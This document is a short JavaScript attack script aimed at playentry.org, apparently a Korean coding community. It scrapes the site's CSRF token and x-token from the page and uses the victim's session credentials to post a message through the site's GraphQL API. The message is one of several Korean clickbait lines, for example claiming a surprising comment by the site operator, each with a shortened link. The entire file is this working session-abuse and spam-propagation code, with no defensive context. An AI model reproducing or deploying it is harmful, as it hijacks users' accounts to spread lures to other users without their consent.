let csrf;
let body;
async function getCookie ()  {
  csrf = await fetch("https://playentry.org");
  body = await csrf.text();
}
getCookie().then(()=>{
const index = body.indexOf("csrf-token") + 21;
const csrfToken = body.slice(index, index + 36);
const xToken = body.split('xToken":"')[1].split('"')[0]

const helpmoongu = Math.random() * 3
if (helpmoongu == 3) {
  helpmoongu = 2
}
goodmoongu = ["https://naver.me/GB5WFMbK 운영자님 댓글 ㄷㄷ", "엔프님이 이런거 하셨던걸 아시나요? https://naver.me/GB5WFMbK", "https://naver.me/GB5WFMbK 운영자도 이럴땨가 있었습니다(?)"]

fetch("https://playentry.org/graphql/", {
  headers: {
    "content-type": "application/json",
    "csrf-token": `${csrfToken}`,
    "x-client-type": "Client",
    "x-token": `${xToken}`,
  },
  referrerPolicy: "unsafe-url",
  body: `{"query":"mutation CREATE_ENTRYSTORY($content: String){createEntryStory(content: $content){warning}}","variables":{"content":"${goodmoongu[Math.floor(helpmoongu)]}"}}`,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
})
